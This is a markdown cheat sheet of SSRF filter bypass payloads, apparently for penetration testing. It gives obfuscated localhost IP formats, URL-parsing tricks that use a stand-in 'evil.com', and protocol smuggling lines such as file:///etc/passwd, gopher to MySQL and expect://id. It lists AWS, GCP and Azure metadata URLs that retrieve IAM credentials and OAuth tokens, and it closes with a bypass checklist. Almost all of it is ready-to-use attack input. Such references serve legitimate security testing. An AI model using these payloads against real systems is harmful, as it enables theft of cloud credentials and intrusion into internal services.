# SSRF Filter Bypass Techniques

## IP Address Obfuscation

### IPv6 Localhost
```
http://[::1]/
http://[::]:80/
http://[0:0:0:0:0:0:0:1]/
```

### Decimal IP (127.0.0.1 = 2130706433)
```
http://2130706433/
http://2130706433:8080/admin
```

### Hex IP
```
http://0x7f000001/
http://0x7f000001:8080/
```

### Short Form
```
http://127.1/
http://127.0.1/
http://127.0.0.1:80/
```

### Octal IP
```
http://0177.0.0.1/
```

## URL Parsing Tricks

### @ Notation (Credentials Trick)
```
http://target.com@127.0.0.1/
http://anything@169.254.169.254/
```

### Hash/Fragment Trick
```
http://127.0.0.1#@evil.com
http://127.0.0.1%23@evil.com
```

### DNS Rebinding
```
# Point a domain to both external and internal IPs
# First resolution passes filter (external), second hits internal
```

### 302 Redirect
```
# If the server follows redirects, host a 302 on an allowed domain
# that redirects to internal resources
```

## Protocol Smuggling

### Alternative Protocols
```
file:///etc/passwd
gopher://127.0.0.1:3306/_<payload>
dict://127.0.0.1:6379/
```

### PHP Wrappers (if PHP backend)
```
php://filter/convert.base64-encode/resource=/etc/passwd
expect://id
```

## Cloud Metadata Endpoints

### AWS
```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>
http://169.254.169.254/latest/user-data/
```

### GCP
```
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
# Requires header: Metadata-Flavor: Google
```

### Azure
```
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2019-08-01&resource=https://management.azure.com/
# Requires header: Metadata: true
```

## Less Common SSRF Attack Surfaces

- **Partial URLs in request body** (not full URLs)
- **URLs within data files** (XML imports, CSV imports)
- **Referer header** (some apps fetch the Referer URL)
- **Link preview features**
- **PDF generation from URLs**
- **Webhook configuration testing**
- **Image/avatar URL fetching**
- **RSS feed fetching**

## Blind SSRF Detection

Use out-of-band techniques when the response isn't visible:
1. Burp Collaborator
2. interactsh (open-source alternative)
3. Custom DNS logger

If you get DNS but no HTTP callback, outgoing HTTP may be filtered — exploitation is much harder.

## Filter Bypass Checklist

- [ ] Try all IP obfuscation formats
- [ ] Try @ notation with allowed domains
- [ ] Try 302 redirect via allowed domain
- [ ] Try alternative protocols (file://, gopher://, dict://)
- [ ] Try DNS rebinding
- [ ] Try URL encoding of bypass characters
- [ ] Try double URL encoding
- [ ] Try Unicode normalization tricks
